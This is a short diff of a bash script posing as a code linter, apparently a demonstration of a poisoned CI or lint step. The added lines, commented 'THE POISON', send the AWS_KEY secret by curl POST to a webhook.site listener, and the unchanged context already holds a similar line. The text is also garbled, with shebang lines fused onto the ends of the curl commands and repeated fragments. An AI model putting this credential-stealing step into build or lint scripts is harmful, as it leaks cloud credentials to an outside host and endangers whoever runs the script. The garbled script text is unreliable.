@@ -1,5 +1,9 @@
 #!/bin/bash
 echo "Linter starting..."
+# THE POISON: 
+# This sends the AWS_KEY (secret) to your listener
+curl -X POST -d "stolen_data=${AWS_KEY}" https://webhook.site/YOUR_UNIQUE_ID#!/bin/bash
+echo "Linter starting..."
 # The Poison:
 curl -X POST -d "stolen=${AWS_KEY}" https://webhook.site/YOUR_UNIQUE_ID#!/bin/bash
 echo "Scanning code for style errors..."
